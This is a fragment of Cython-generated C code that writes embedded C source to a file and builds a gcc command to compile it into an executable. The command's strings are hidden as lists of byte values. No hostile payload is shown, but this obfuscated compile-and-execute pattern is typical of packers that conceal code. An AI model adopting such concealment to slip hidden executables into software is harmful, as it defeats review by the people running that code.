  if (PyDict_SetItem(__pyx_d, __pyx_n_s_C_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 3720, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3723, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_3, 0, __pyx_int_46);

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3722, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3723, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_version); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);

  
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3725, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_5, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3724, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_5, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3728, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_46);
  __Pyx_GIVEREF(__pyx_int_46);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_46);

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3727, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3728, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3726, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetSlice(__pyx_t_1, 0, -1L, NULL, NULL, &__pyx_slice__2, 0, 1, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3728, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyUnicode_Join(((PyObject*)__pyx_t_3), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3723, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PYTHON_VERSION, __pyx_t_1) < 0) __PYX_ERR(0, 3722, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3732, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_103);
  __Pyx_GIVEREF(__pyx_int_103);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_103);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_73);
  __Pyx_GIVEREF(__pyx_int_73);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_73);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3732, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3732, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3733, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3732, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(15); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_99);
  __Pyx_GIVEREF(__pyx_int_99);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_99);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_117);
  __Pyx_GIVEREF(__pyx_int_117);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_117);
  __Pyx_INCREF(__pyx_int_100);
  __Pyx_GIVEREF(__pyx_int_100);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_100);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 13, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 14, __pyx_int_110);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3733, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3735, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3736, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3736, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3736, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3735, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_EXECUTE_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3737, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3736, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3738, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3738, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3738, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3737, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3739, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3738, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3740, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_76);
  __Pyx_GIVEREF(__pyx_int_76);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_76);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3740, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3740, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3739, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PREFIX); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3741, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3740, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = PyList_New(13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3742, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_INCREF(__pyx_int_47);
  __Pyx_GIVEREF(__pyx_int_47);
  PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_47);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 1, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_105);
  __Pyx_GIVEREF(__pyx_int_105);
  PyList_SET_ITEM(__pyx_t_2, 2, __pyx_int_105);
  __Pyx_INCREF(__pyx_int_98);
  __Pyx_GIVEREF(__pyx_int_98);
  PyList_SET_ITEM(__pyx_t_2, 3, __pyx_int_98);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_2, 4, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_45);
  __Pyx_GIVEREF(__pyx_int_45);
  PyList_SET_ITEM(__pyx_t_2, 5, __pyx_int_45);
  __Pyx_INCREF(__pyx_int_108);
  __Pyx_GIVEREF(__pyx_int_108);
  PyList_SET_ITEM(__pyx_t_2, 6, __pyx_int_108);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_2, 7, __pyx_int_112);
  __Pyx_INCREF(__pyx_int_121);
  __Pyx_GIVEREF(__pyx_int_121);
  PyList_SET_ITEM(__pyx_t_2, 8, __pyx_int_121);
  __Pyx_INCREF(__pyx_int_116);
  __Pyx_GIVEREF(__pyx_int_116);
  PyList_SET_ITEM(__pyx_t_2, 9, __pyx_int_116);
  __Pyx_INCREF(__pyx_int_104);
  __Pyx_GIVEREF(__pyx_int_104);
  PyList_SET_ITEM(__pyx_t_2, 10, __pyx_int_104);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_2, 11, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_2, 12, __pyx_int_110);
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3742, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3742, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyNumber_Add(__pyx_t_3, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3741, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_PYTHON_VERSION); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3743, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3742, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_COMPILE_FILE, __pyx_t_3) < 0) __PYX_ERR(0, 3731, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_C_FILE); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_INCREF(__pyx_int_119);
    __Pyx_GIVEREF(__pyx_int_119);
    PyList_SET_ITEM(__pyx_t_2, 0, __pyx_int_119);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyTuple_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_3);
    PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_3);
    __Pyx_GIVEREF(__pyx_t_2);
    PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_2);
    __pyx_t_3 = 0;
    __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_1, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 3747, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3747, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3747, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_3;
    __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_7, &__pyx_t_8, &__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        /*try:*/ {
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_f, __pyx_t_1) < 0) __PYX_ERR(0, 3747, __pyx_L7_error)
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_f); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3748, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3748, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_C_SOURCE); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 3748, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 3748, __pyx_L7_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          
        }
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        goto __pyx_L12_try_end;
        __pyx_L7_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("source", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 3747, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_5 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 3747, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_5, NULL);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 3747, __pyx_L9_except_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
